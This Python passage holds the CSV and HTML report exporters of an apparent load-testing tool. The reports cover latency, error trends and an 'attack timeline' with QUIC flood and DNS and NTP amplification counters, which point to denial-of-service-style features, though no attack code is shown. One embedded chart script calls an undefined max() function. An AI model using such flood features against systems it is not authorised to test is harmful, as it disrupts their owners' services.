            for k in ('detected', 'severity', 'confidence', 'response_time_growth_pct',
                      'error_rate_growth_pp', 'early_avg_ms', 'late_avg_ms',
                      'early_error_rate', 'late_error_rate', 'monotonic_ratio', 'details'):
                writer.writerow([k, deg.get(k, '')])
            if deg.get('windows'):
                writer.writerow([])
                writer.writerow(['window_start_s', 'window_end_s', 'avg_ms', 'error_rate'])
                for w in deg['windows']:
                    writer.writerow([w['start_s'], w['end_s'], w['avg_ms'], w['error_rate']])

            cap = m.capacity()
            writer.writerow([])
            writer.writerow(['--- SERVER CAPACITY ESTIMATION ---'])
            writer.writerow(['metric', 'value'])
            for k, v in cap.items():
                writer.writerow([k, v])

            timeline = m.attack_timeline()
            writer.writerow([])
            writer.writerow(['--- ATTACK TIMELINE ---'])
            writer.writerow(['event_index', 'elapsed_s', 'type', 'label'])
            for i, ev in enumerate(timeline['events'], 1):
                writer.writerow([i, ev.get('t', 0), ev.get('type', ''), ev.get('label', '')])
            if timeline['phases']:
                writer.writerow([])
                writer.writerow(['--- CHAIN PHASES ---'])
                writer.writerow(['pattern', 'start_s', 'end_s'])
                for ph in timeline['phases']:
                    writer.writerow([ph['pattern'], ph['start_s'], ph['end_s']])
            if timeline['vector_usage']:
                writer.writerow([])
                writer.writerow(['--- MULTI-VECTOR USAGE ---'])
                writer.writerow(['vector', 'iterations'])
                for vk, vv in sorted(timeline['vector_usage'].items(), key=lambda x: -x[1]):
                    writer.writerow([vk, vv])
            if timeline['intensity_history']:
                writer.writerow([])
                writer.writerow(['--- ADAPTIVE INTENSITY HISTORY ---'])
                writer.writerow(['elapsed_s', 'factor', 'reason'])
                for ih in timeline['intensity_history']:
                    writer.writerow([ih['t'], ih['factor'], ih['reason']])

            if m.quic_packets_sent:
                writer.writerow([])
                writer.writerow(['--- QUIC FLOOD ---'])
                writer.writerow(['quic_packets_sent', m.quic_packets_sent])
                writer.writerow(['quic_responses', m.quic_responses])
            if m.dns_queries_sent:
                writer.writerow([])
                writer.writerow(['--- DNS AMPLIFICATION SIM ---'])
                writer.writerow(['dns_queries_sent', m.dns_queries_sent])
                writer.writerow(['dns_responses', m.dns_responses])
                writer.writerow(['dns_bytes_sent', m.dns_bytes_sent])
                writer.writerow(['dns_bytes_recv', m.dns_bytes_recv])
                writer.writerow(['dns_avg_amplification',
                                 f'{(m.dns_bytes_recv / m.dns_bytes_sent) if m.dns_bytes_sent else 0:.2f}'])
            if m.ntp_queries_sent:
                writer.writerow([])
                writer.writerow(['--- NTP AMPLIFICATION SIM ---'])
                writer.writerow(['ntp_queries_sent', m.ntp_queries_sent])
                writer.writerow(['ntp_responses', m.ntp_responses])
                writer.writerow(['ntp_bytes_sent', m.ntp_bytes_sent])
                writer.writerow(['ntp_bytes_recv', m.ntp_bytes_recv])
                writer.writerow(['ntp_avg_amplification',
                                 f'{(m.ntp_bytes_recv / m.ntp_bytes_sent) if m.ntp_bytes_sent else 0:.2f}'])

            if m.heatmap_history:
                writer.writerow([])
                writer.writerow(['--- RESPONSE TIME HEATMAP ---'])
                writer.writerow(['second_index'] + list(LATENCY_BAND_LABELS))
                for i, col in enumerate(m.heatmap_history[-120:], 1):
                    writer.writerow([i] + [col.get(band, 0) for band in LATENCY_BAND_LABELS])

            if m.percentile_history:
                writer.writerow([])
                writer.writerow(['--- PERCENTILE TREND ---'])
                writer.writerow(['second_index', 'p50_ms', 'p95_ms', 'p99_ms'])
                for i, h in enumerate(m.percentile_history[-120:], 1):
                    writer.writerow([i, f"{h.get('p50', 0):.2f}", f"{h.get('p95', 0):.2f}", f"{h.get('p99', 0):.2f}"])

            writer.writerow([])
            writer.writerow(['--- TREND ANALYSIS (v10.0) ---'])
            writer.writerow(['--- PERCENTILE EVOLUTION & ERROR PREDICTION & HEALTH ---'])
            writer.writerow(['section', 'key', 'value'])
            p_ev = m.percentile_evolution()
            writer.writerow(['percentile_evolution', 'available', p_ev.get('available', False)])
            if p_ev.get('available'):
                writer.writerow(['percentile_evolution', 'samples', p_ev.get('samples', 0)])
                writer.writerow(['percentile_evolution', 'stability', p_ev.get('stability', '')])
                writer.writerow(['percentile_evolution', 'convergence_pct', p_ev.get('convergence_pct', 0)])
                writer.writerow(['percentile_evolution', 'p99_p50_spread_ms', p_ev.get('p99_p50_spread_ms', 0)])
                writer.writerow(['percentile_evolution', 'projected_p95_ms', p_ev.get('projected_p95_ms', 0)])
                writer.writerow(['percentile_evolution', 'interpretation', p_ev.get('interpretation', '')])
                for pkey in ('p50', 'p95', 'p99'):
                    pt = p_ev.get(pkey) or {}
                    writer.writerow([f'percentile_{pkey}_trend', 'slope_per_sec', pt.get('slope_per_sec', 0)])
                    writer.writerow([f'percentile_{pkey}_trend', 'growth_pct', pt.get('growth_pct', 0)])
                    writer.writerow([f'percentile_{pkey}_trend', 'direction', pt.get('direction', '')])
                    writer.writerow([f'percentile_{pkey}_trend', 'projected_next_30s', pt.get('projected_next_30s', 0)])
                    writer.writerow([f'percentile_{pkey}_trend', 'first', pt.get('first', 0)])
                    writer.writerow([f'percentile_{pkey}_trend', 'last', pt.get('last', 0)])

            err_pred = m.error_rate_prediction()
            writer.writerow(['error_rate_prediction', 'available', err_pred.get('available', False)])
            if err_pred.get('available'):
                for k in ('current_error_rate', 'mean_error_rate', 'recent_avg_error_rate',
                          'slope_per_sec', 'r_squared', 'confidence',
                          'predicted_error_rate_30s', 'predicted_error_rate_60s',
                          'trend', 'risk_level', 'breach_seconds_to_5pct', 'rps_slope'):
                    writer.writerow(['error_rate_prediction', k, err_pred.get(k, '')])

            hs = m.health_score()
            writer.writerow(['server_health', 'score', hs.get('score', 0)])
            writer.writerow(['server_health', 'grade', hs.get('grade', '')])
            writer.writerow(['server_health', 'status', hs.get('status', '')])
            writer.writerow(['server_health', 'interpretation', hs.get('interpretation', '')])
            for ck, cv in (hs.get('components') or {}).items():
                writer.writerow([f'server_health_component_{ck}', 'value', cv])

            te = m.throughput_efficiency()
            writer.writerow(['throughput_efficiency', 'available', te.get('available', False)])
            if te.get('available'):
                for k in ('bytes_per_request', 'avg_bytes_per_sec', 'peak_bytes_per_sec',
                          'bandwidth_utilization', 'pipeline_efficiency', 'efficiency_pct',
                          'mean_rps', 'peak_rps', 'rps_stability', 'saturation',
                          'wasted_transfer_pct', 'interpretation'):
                    writer.writerow(['throughput_efficiency', k, te.get(k, '')])

            if m.health_score_history:
                writer.writerow([])
                writer.writerow(['--- HEALTH SCORE OVER TIME ---'])
                writer.writerow(['elapsed_s', 'score', 'grade'])
                for h in m.health_score_history[-300:]:
                    writer.writerow([h.get('t', 0), h.get('score', 0), h.get('grade', '')])

            bn = self._realtime_bottleneck()
            writer.writerow([])
            writer.writerow(['--- BOTTLENECK DETECTION (v10.0) ---'])
            writer.writerow(['metric', 'value'])
            writer.writerow(['primary', bn.get('primary', '')])
            writer.writerow(['severity', bn.get('severity', '')])
            writer.writerow(['confidence', bn.get('confidence', 0)])
            writer.writerow(['detail', bn.get('detail', '')])
            writer.writerow(['signals', '; '.join(bn.get('signals') or [])])
            for sk, sv in (bn.get('scores') or {}).items():
                writer.writerow([f'signal_score_{sk}', sv])
            if m.bottleneck_history:
                writer.writerow([])
                writer.writerow(['bottleneck_elapsed_s', 'primary', 'severity', 'confidence'])
                for b in m.bottleneck_history[-100:]:
                    writer.writerow([b.get('t', 0), b.get('primary', ''),
                                     b.get('severity', ''), b.get('confidence', 0)])

            conn_h = self.connection_health()
            writer.writerow([])
            writer.writerow(['--- CONNECTION HEALTH (v10.0) ---'])
            writer.writerow(['metric', 'value'])
            for k in ('overall_success_pct', 'window_success_pct', 'window_samples',
                      'avg_connect_ms', 'consecutive_failures', 'max_consecutive_failures',
                      'status', 'tracked_workers', 'time_since_last_failure_s'):
                writer.writerow([k, conn_h.get(k, '')])

            if self.cfg.get('auto_tune') or m.auto_tune_history:
                writer.writerow([])
                writer.writerow(['--- AUTO-TUNING HISTORY (v10.0) ---'])
                writer.writerow(['elapsed_s', 'worker_delay', 'batch_size', 'reason'])
                for a in m.auto_tune_history:
                    writer.writerow([a.get('t', 0), a.get('worker_delay', 0),
                                     a.get('batch_size', 0), a.get('reason', '')])

            if self.cfg.get('smart_distribution') or m.smart_url_picks:
                writer.writerow([])
                writer.writerow(['--- SMART LOAD DISTRIBUTION (v10.0) ---'])
                writer.writerow(['enabled', bool(self.cfg.get('smart_distribution', False))])
                writer.writerow(['url', 'picks'])
                for uk, uv in sorted(m.smart_url_picks.items(), key=lambda x: -x[1]):
                    writer.writerow([uk, uv])

            if m.graphql_queries_sent or m.rest_requests_sent or m.ws_chat_messages_sent:
                writer.writerow([])
                writer.writerow(['--- V10 PATTERN COUNTERS ---'])
                writer.writerow(['graphql_queries_sent', m.graphql_queries_sent])
                writer.writerow(['graphql_errors', m.graphql_errors])
                writer.writerow(['rest_requests_sent', m.rest_requests_sent])
                writer.writerow(['ws_chat_messages_sent', m.ws_chat_messages_sent])

            if m.validation_rule_fails:
                writer.writerow([])
                writer.writerow(['--- CUSTOM RULE FAILURES ---'])
                writer.writerow(['rule', 'fail_count'])
                for rule_label, count in sorted(m.validation_rule_fails.items(), key=lambda x: -x[1]):
                    writer.writerow([rule_label, count])

            r10 = m.rolling_data.get_stats(10)
            r30 = m.rolling_data.get_stats(30)
            r60 = m.rolling_data.get_stats(60)
            writer.writerow([])
            writer.writerow(['rolling_window', 'rps', 'avg_ms', 'p95_ms', 'error_rate', 'count'])
            writer.writerow(['10s', f'{r10["rps"]:.2f}', f'{r10["avg_ms"]:.2f}', f'{r10["p95_ms"]:.2f}', f'{r10["error_rate"]:.2f}', r10['count']])
            writer.writerow(['30s', f'{r30["rps"]:.2f}', f'{r30["avg_ms"]:.2f}', f'{r30["p95_ms"]:.2f}', f'{r30["error_rate"]:.2f}', r30['count']])
            writer.writerow(['60s', f'{r60["rps"]:.2f}', f'{r60["avg_ms"]:.2f}', f'{r60["p95_ms"]:.2f}', f'{r60["error_rate"]:.2f}', r60['count']])

            for label, count in m.latency_buckets.items():
                writer.writerow([f'latency_{label}', count])
            for etype, ecount in m.error_type_counts.items():
                writer.writerow([f'error_{etype}', ecount])

            if m._rps_history:
                writer.writerow([])
                writer.writerow(['per_second_timeline'])
                writer.writerow(['second', 'rps', 'bytes_per_second', 'error_rate', 'error_count'])
                for i, rps in enumerate(m._rps_history):
                    tp = m._throughput_history[i] if i < len(m._throughput_history) else 0
                    err = m._error_rate_history[i] if i < len(m._error_rate_history) else 0
                    err_cnt = m._error_per_second[i] if i < len(m._error_per_second) else 0
                    writer.writerow([i + 1, f'{rps:.2f}', f'{tp:.2f}', f'{err:.2f}', err_cnt])

            if m.request_logs:
                writer.writerow([])
                writer.writerow(['--- PER-REQUEST LOGS ---'])
                writer.writerow(['timestamp', 'correlation_id', 'url', 'method', 'pattern', 'status',
                                 'response_time_ms', 'size_bytes', 'connect_time_ms', 'ttfb_ms',
                                 'download_ms', 'error', 'valid', 'failed_rules',
                                 'assertion_failures', 'response_snippet'])
                for log in m.request_logs[-10000:]:
                    writer.writerow([
                        datetime.fromtimestamp(log.timestamp).isoformat(),
                        log.correlation_id,
                        log.url[:100], log.method, log.pattern, log.status,
                        f'{log.response_time_ms:.2f}', log.size_bytes,
                        f'{log.connect_time_ms:.2f}', f'{log.ttfb_ms:.2f}', f'{log.download_ms:.2f}',
                        log.error or '', log.valid,
                        ';'.join(log.failed_rules or []),
                        ';'.join(log.assertion_failures or []),
                        (log.response_snippet or '')[:200],
                    ])

        print(f"    {Fore.GREEN}[+] CSV report saved: {path}{Style.RESET_ALL}")

    def export_html(self, path: str):
        m = self.metrics
        s = m.snapshot()
        dur = s['dur']
        buckets = s['buckets']
        total_lat = sum(buckets.values()) or 1

        bar_rows = ''
        for label, count in buckets.items():
            pct = count / total_lat * 100
            color = '#3fb950' if '<50' in label or '50-100' in label or '100-200' in label else ('#d29922' if '200' in label or '500' in label else '#f85149')
            bar_rows += f'<div style="margin:3px 0"><span style="width:100px;display:inline-block;font-weight:600">{label}</span><div style="background:{color};height:18px;width:{max(1,pct)}%;display:inline-block;border-radius:3px"></div> <span>{pct:.1f}%</span></div>\n'

        sc_rows = ''
        for code, count in sorted(m.status_codes.items()):
            color = '#3fb950' if code.startswith('2') else ('#d29922' if code.startswith('3') else '#f85149')
            sc_rows += f'<tr><td style="color:{color};font-weight:700">HTTP {code}</td><td>{count:,}</td></tr>\n'

        err_rows = ''
        for etype, ecount in sorted(s['error_type_counts'].items(), key=lambda x: -x[1]):
            if ecount > 0:
                err_rows += f'<tr><td>{etype}</td><td style="color:#f85149">{ecount:,}</td></tr>\n'

        rps_data = json.dumps(list(m._rps_history)[-180:])
        rt_data = json.dumps(list(m._response_times_history)[-180:])
        tp_data = json.dumps([round(v, 2) for v in list(m._throughput_history)[-180:]])
        err_hist_data = json.dumps([round(v, 2) for v in list(m._error_rate_history)[-180:]])

        concurrent_data = []
        if m._rps_history:
            for i, rps in enumerate(m._rps_history):
                concurrent_data.append(min(self.cfg['users'], int(rps * 2)))
        concurrent_json = json.dumps(concurrent_data[-180:])

        latency_labels = json.dumps(list(buckets.keys()))
        latency_values = json.dumps(list(buckets.values()))
        latency_colors = json.dumps([
            '#3fb950' if '<50' in l or '50-100' in l or '100-200' in l
            else '#d29922' if '200' in l or '500' in l
            else '#f85149' for l in buckets.keys()
        ])

        p50_hist = json.dumps([round(h.get('p50', 0), 2) for h in m.percentile_history[-180:]])
        p95_hist = json.dumps([round(h.get('p95', 0), 2) for h in m.percentile_history[-180:]])
        p99_hist = json.dumps([round(h.get('p99', 0), 2) for h in m.percentile_history[-180:]])
        clusters = m.analyze_error_clusters()
        est = m.resource_estimation()
        box = m.box_plot()
        err_corr = m.error_correlation()
        deg = m.degradation()
        cap = m.capacity()
        timeline = m.attack_timeline()

        timeline_json = json.dumps(timeline['events'][-300:])
        timeline_duration = timeline['duration'] or 1.0
        intensity_json = json.dumps([
            {'t': ih['t'], 'factor': ih['factor']} for ih in timeline['intensity_history'][-200:]
        ])
        phases_json = json.dumps(timeline['phases'])

        heat_cells = ''
        heat_history = list(m.heatmap_history)[-30:]
        if heat_history:
            heat_max = 1
            for col in heat_history:
                for v in col.values():
                    if v > heat_max:
                        heat_max = v
            heat_cells = '<table class="heatmap"><tr><th>Band</th>'
            for i in range(len(heat_history)):
                heat_cells += f'<th>{i + 1}</th>'
            heat_cells += '</tr>'
            for band in LATENCY_BAND_LABELS:
                heat_cells += f'<tr><td>{band}</td>'
                for col in heat_history:
                    v = col.get(band, 0)
                    alpha = 0.0 if v <= 0 else min(1.0, 0.12 + 0.88 * (v / heat_max))
                    bg = f'rgba(88,166,255,{alpha:.2f})' if v > 0 else '#0d1117'
                    heat_cells += f'<td style="background:{bg};text-align:center" title="{v} requests">{v if v else ""}</td>'
                heat_cells += '</tr>'
            heat_cells += '</table>'

        cluster_rows = ''
        for i, c in enumerate(clusters['top_clusters'], 1):
            cluster_rows += (
                f'<tr><td>#{i}</td><td>{_html_escape(c["type"])}</td><td>{c["count"]:,}</td>'
                f'<td>{c["start_s"]:.1f}s</td><td>{c["end_s"]:.1f}s</td>'
                f'<td>{c["duration_s"]:.1f}s</td></tr>\n')

        log_rows_html = ''
        sample_logs = list(m.request_logs)[-500:]
        for log in sample_logs:
            status_cls = ('2xx' if str(log.status).startswith('2')
                          else '3xx' if str(log.status).startswith('3')
                          else '4xx' if str(log.status).startswith('4')
                          else '5xx' if str(log.status).startswith('5') else 'err')
            err_txt = log.error or ''
            snippet = _html_escape((log.response_snippet or '')[:80])
            corr = _html_escape(log.correlation_id or '')
            log_rows_html += (
                f'<tr data-url="{_html_escape(log.url)}" data-status="{log.status}" '
                f'data-rt="{log.response_time_ms:.2f}" data-cls="{status_cls}">'
                f'<td title="{_html_escape(log.url)}">{_html_escape(log.url[:42])}</td>'
                f'<td style="color:{"#3fb950" if status_cls == "2xx" else "#f85149"}">{log.status}</td>'
                f'<td>{log.response_time_ms:.1f}</td><td>{log.size_bytes}</td>'
                f'<td>{corr}</td><td>{err_txt}</td><td title="{snippet}">{snippet[:40]}</td></tr>\n')

        html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>LoadStorm v10.0 Report - {self.cfg['url']}</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 30px; }}
h1 {{ color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }}
.card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 15px 0; }}
.card h2 {{ color: #58a6ff; font-size: 1.1em; margin-top: 0; }}
.stat {{ display: inline-block; text-align: center; padding: 10px 20px; margin: 5px; background: #0d1117; border-radius: 6px; border: 1px solid #30363d; min-width: 120px; }}
.stat .val {{ font-size: 1.8em; font-weight: 700; color: #58a6ff; }}
.stat .lbl {{ font-size: 0.85em; color: #8b949e; margin-top: 4px; }}
.green {{ color: #3fb950 !important; }}
.red {{ color: #f85149 !important; }}
.yellow {{ color: #d29922 !important; }}
table {{ width: 100%; border-collapse: collapse; }}
th, td {{ padding: 8px 12px; text-align: left; border-bottom: 1px solid #30363d; }}
th {{ color: #8b949e; font-weight: 600; }}
.verdict {{ font-size: 1.4em; font-weight: 700; padding: 15px; border-radius: 8px; text-align: center; margin: 15px 0; }}
.chart-container {{ position: relative; height: 300px; }}
.rolling {{ display: flex; gap: 15px; flex-wrap: wrap; }}
.rolling .stat {{ min-width: 200px; }}
.heatmap td, .heatmap th {{ padding: 4px 6px; font-size: 0.8em; text-align: center; border: 1px solid #30363d; }}
.filter-bar {{ display: flex; gap: 12px; flex-wrap: wrap; align-items: center; margin-bottom: 12px; }}
.filter-bar input[type=text], .filter-bar input[type=number] {{ background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 6px 10px; border-radius: 4px; }}
.filter-bar label {{ color: #8b949e; font-size: 0.9em; }}
.filter-bar button {{ background: #238636; color: #fff; border: none; padding: 6px 14px; border-radius: 4px; cursor: pointer; }}
#reqTable {{ font-size: 0.85em; }}
#reqTable tr[style*="none"] {{ display: none; }}
.tl-track {{ position: relative; height: 36px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; margin: 8px 0; overflow: hidden; }}
.tl-phase {{ position: absolute; top: 0; height: 100%; opacity: 0.75; border-right: 1px solid #0d1117; }}
.tl-phase:hover {{ opacity: 1; }}
.tl-event {{ position: absolute; top: 4px; width: 10px; height: 10px; border-radius: 50%; cursor: pointer; }}
.tl-event:hover {{ transform: scale(1.5); z-index: 5; }}
.tl-labels {{ display: flex; justify-content: space-between; color: #8b949e; font-size: 0.8em; }}
.tl-detail {{ min-height: 40px; padding: 8px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; font-family: monospace; font-size: 0.85em; }}
</style></head><body>
<h1>LoadStorm v10.0 Test Report</h1>
<div class="card">
<h2>Target Information</h2>
<table>
<tr><th>URL</th><td>{self.cfg['url']}</td></tr>
<tr><th>Pattern</th><td>{self.cfg['pattern'].value}</td></tr>
<tr><th>Virtual Users</th><td>{self.cfg['users']:,}</td></tr>
<tr><th>Concurrency</th><td>{self.cfg['concurrency']:,}</td></tr>
<tr><th>Duration</th><td>{dur:.2f} seconds</td></tr>
<tr><th>HTTP/2</th><td>{"Enabled" if self.cfg.get('http2') else "Disabled"}</td></tr>
<tr><th>Geo Simulation</th><td>{"Enabled (6 regions)" if self.cfg.get('geo_simulation') else "Disabled"}</td></tr>
</table></div>
<div class="card">
<h2>Key Metrics</h2>
<div class="stat"><div class="val">{m.total_requests:,}</div><div class="lbl">Total Requests</div></div>
<div class="stat"><div class="val green">{m.successful:,}</div><div class="lbl">Successful</div></div>
<div class="stat"><div class="val red">{m.failed:,}</div><div class="lbl">Failed</div></div>
<div class="stat"><div class="val yellow">{s['rate']:.2f}%</div><div class="lbl">Success Rate</div></div>
<div class="stat"><div class="val">{m.avg_rps:,.1f}</div><div class="lbl">Avg RPS</div></div>
<div class="stat"><div class="val">{m.peak_rps:,.1f}</div><div class="lbl">Peak RPS</div></div>
<div class="stat"><div class="val">{m.max_concurrent:,}</div><div class="lbl">Max Concurrent</div></div>
<div class="stat"><div class="val">{s['mbps']:.2f}</div><div class="lbl">MB/s</div></div>
<div class="stat"><div class="val green">{m.total_bytes_sent/1024/1024:.2f}</div><div class="lbl">MB Sent</div></div>
<div class="stat"><div class="val">{m.total_bytes_recv/1024/1024:.2f}</div><div class="lbl">MB Received</div></div>
</div>"""

        html += f"""
<div class="card">
<h2>Timing Analysis</h2>
<div class="stat"><div class="val">{m.avg_connect_time:.1f}</div><div class="lbl">Avg Connect (ms)</div></div>
<div class="stat"><div class="val">{m.avg_ttfb:.1f}</div><div class="lbl">Avg TTFB (ms)</div></div>
<div class="stat"><div class="val">{m.avg_server_processing:.1f}</div><div class="lbl">Est. Server Proc (ms)</div></div>
<div class="stat"><div class="val">{m.avg_network_overhead:.1f}</div><div class="lbl">Est. Network O/H (ms)</div></div>
<div class="stat"><div class="val">{m.avg_error_recovery:.1f}</div><div class="lbl">Avg Recovery (ms)</div></div>
<div class="stat"><div class="val red">{m.max_error_recovery:.1f}</div><div class="lbl">Max Recovery (ms)</div></div>
</div>

<div class="card">
<h2>Rolling Window Stats</h2>
<div class="rolling">
<div class="stat" style="border-color:#58a6ff"><div class="val">{s['rolling_10s']['rps']:.1f}</div><div class="lbl">10s RPS (Avg: {s['rolling_10s']['avg_ms']:.1f}ms)</div></div>
<div class="stat" style="border-color:#3fb950"><div class="val">{s['rolling_30s']['rps']:.1f}</div><div class="lbl">30s RPS (Avg: {s['rolling_30s']['avg_ms']:.1f}ms)</div></div>
<div class="stat" style="border-color:#d29922"><div class="val">{s['rolling_60s']['rps']:.1f}</div><div class="lbl">1m RPS (Avg: {s['rolling_60s']['avg_ms']:.1f}ms)</div></div>
</div>
</div>"""

        html += f"""
<div class="card">
<h2>Response Time Over Time</h2>
<div class="chart-container"><canvas id="rtChart"></canvas></div>
<script>
new Chart(document.getElementById('rtChart'), {{
  type: 'line',
  data: {{
    labels: {rt_data}.map((_, i) => i + 1),
    datasets: [{{
      label: 'Avg Response Time (ms)',
      data: {rt_data},
      borderColor: '#58a6ff',
      backgroundColor: 'rgba(88,166,255,0.1)',
      fill: true,
      tension: 0.3
    }}]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Second', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: 'ms', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>

<div class="card">
<h2>RPS Over Time</h2>
<div class="chart-container"><canvas id="rpsChart"></canvas></div>
<script>
new Chart(document.getElementById('rpsChart'), {{
  type: 'line',
  data: {{
    labels: {rps_data}.map((_, i) => i + 1),
    datasets: [{{
      label: 'Requests/sec',
      data: {rps_data},
      borderColor: '#58a6ff',
      backgroundColor: 'rgba(88,166,255,0.1)',
      fill: true,
      tension: 0.3
    }}]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Second', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: 'RPS', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>

<div class="card">
<h2>Error Rate Over Time</h2>
<div class="chart-container"><canvas id="errChart"></canvas></div>
<script>
new Chart(document.getElementById('errChart'), {{
  type: 'line',
  data: {{
    labels: {err_hist_data}.map((_, i) => i + 1),
    datasets: [{{
      label: 'Error Rate %',
      data: {err_hist_data},
      borderColor: '#f85149',
      backgroundColor: 'rgba(248,81,73,0.1)',
      fill: true,
      tension: 0.3
    }}]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Second', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: '%', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }}, min: 0, max: 100 }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>

<div class="card">
<h2>Concurrent Users Over Time</h2>
<div class="chart-container"><canvas id="concurrentChart"></canvas></div>
<script>
new Chart(document.getElementById('concurrentChart'), {{
  type: 'line',
  data: {{
    labels: {concurrent_json}.map((_, i) => i + 1),
    datasets: [{{
      label: 'Concurrent Users',
      data: {concurrent_json},
      borderColor: '#a371f7',
      backgroundColor: 'rgba(163,113,247,0.1)',
      fill: true,
      tension: 0.3
    }}]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Second', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: 'Users', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>

<div class="card">
<h2>Latency Distribution</h2>
<div class="chart-container"><canvas id="latencyDistChart"></canvas></div>
<script>
new Chart(document.getElementById('latencyDistChart'), {{
  type: 'bar',
  data: {{
    labels: {latency_labels},
    datasets: [{{
      label: 'Request Count',
      data: {latency_values},
      backgroundColor: {latency_colors},
      borderColor: {latency_colors},
      borderWidth: 1
    }}]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Latency Range', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: 'Count', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>

<div class="card">
<h2>Network Throughput Over Time</h2>
<div class="chart-container"><canvas id="throughputChart"></canvas></div>
<script>
new Chart(document.getElementById('throughputChart'), {{
  type: 'line',
  data: {{
    labels: {tp_data}.map((_, i) => i + 1),
    datasets: [{{
      label: 'Bytes/sec',
      data: {tp_data},
      borderColor: '#3fb950',
      backgroundColor: 'rgba(63,185,80,0.1)',
      fill: true,
      tension: 0.3
    }}]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Second', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: 'Bytes/sec', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>

<div class="card">
<h2>Error Count Per Second</h2>
<div class="chart-container"><canvas id="errCountChart"></canvas></div>
<script>
new Chart(document.getElementById('errCountChart'), {{
  type: 'bar',
  data: {{
    labels: {err_hist_data}.map((_, i) => i + 1),
    datasets: [{{
      label: 'Errors/sec',
      data: {err_hist_data}.map(v => Math.round(v * {s['total'] + 1} / max(1, {s['dur'] + 1}))),
      backgroundColor: 'rgba(248,81,73,0.6)',
      borderColor: '#f85149',
      borderWidth: 1
    }}]
  }},
  options: {{
    responsive: true,
    maintainAspectRatio: false,
    scales: {{
      x: {{ title: {{ display: true, text: 'Second', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }},
      y: {{ title: {{ display: true, text: 'Errors', color: '#8b949e' }}, ticks: {{ color: '#8b949e' }}, grid: {{ color: '#30363d' }} }}
    }},
    plugins: {{ legend: {{ labels: {{ color: '#c9d1d9' }} }} }}
  }}
}});
</script></div>

<div class="card">
<h2>Response Times (ms)</h2>
<div class="stat"><div class="val">{m.avg_response_time:.1f}</div><div class="lbl">Average</div></div>
<div class="stat"><div class="val">{m.median_response_time:.1f}</div><div class="lbl">Median</div></div>
<div class="stat"><div class="val">{m.p50:.1f}</div><div class="lbl">P50</div></div>
<div class="stat"><div class="val">{m.p90:.1f}</div><div class="lbl">P90</div></div>
<div class="stat"><div class="val">{m.p95:.1f}</div><div class="lbl">P95</div></div>
<div class="stat"><div class="val">{m.p99:.1f}</div><div class="lbl">P99</div></div>
<div class="stat"><div class="val">{m.p999:.1f}</div><div class="lbl">P99.9</div></div>
<div class="stat"><div class="val green">{m.min_rt:.1f}</div><div class="lbl">Min</div></div>
<div class="stat"><div class="val red">{m.max_rt:.1f}</div><div class="lbl">Max</div></div>
<div class="stat"><div class="val">{m.stddev_response_time:.1f}</div><div class="lbl">StdDev</div></div>
<div class="stat"><div class="val">{m.coefficient_of_variation:.3f}</div><div class="lbl">Coeff of Var</div></div>
<div class="stat"><div class="val red">{len(m.statistical_outliers):,}</div><div class="lbl">Outliers (3σ)</div></div>
<div class="stat"><div class="val green">{m.connection_reuse_efficiency:.1f}%</div><div class="lbl">Conn Reuse Eff</div></div>
</div>
<div class="card">
<h2>Latency Distribution (Bars)</h2>
{bar_rows}</div>"""

        if m.validation_passes + m.validation_fails > 0:
            html += f"""
<div class="card">
<h2>Response Validation</h2>
